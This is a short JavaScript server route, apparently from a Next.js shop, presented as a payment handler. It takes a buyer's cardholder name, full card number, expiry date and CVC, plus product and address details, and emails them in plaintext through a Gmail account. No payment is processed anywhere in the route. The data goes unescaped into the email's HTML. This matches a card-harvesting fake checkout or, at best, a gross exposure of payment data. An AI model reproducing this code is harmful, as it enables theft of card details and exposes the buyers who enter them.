
import nodemailer from "nodemailer";

export async function POST(req) {
  const body = await req.json();

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.EMAIL_RECEIVER, 
    subject: "New Payment Received",
    html: `
      <h3>Payment Method: ${body.method}</h3>
      <p><strong>Product:</strong> ${body.productName} (ID: ${body.productId})</p>
      <p><strong>Amount:</strong> ₹${body.price}</p>
      ${
        body.method === "mastercard"
          ? `<p><strong>Cardholder:</strong> ${body.cardDetails.name}</p>
             <p><strong>Card Number:</strong> ${body.cardDetails.number}</p>
             <p><strong>Exp:</strong> ${body.cardDetails.exp}</p>
             <p><strong>CVC:</strong> ${body.cardDetails.cvc}</p>`
          : body.method === "cod"
          ? `<p><strong>Address:</strong> ${body.address}</p>`
          : `<p>PayPal payment via QR</p>`
      }
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    return new Response(JSON.stringify({ success: true }), { status: 200 });
  } catch (err) {
    console.error(err);
    return new Response(JSON.stringify({ error: "Failed to send email" }), { status: 500 });
  }
}
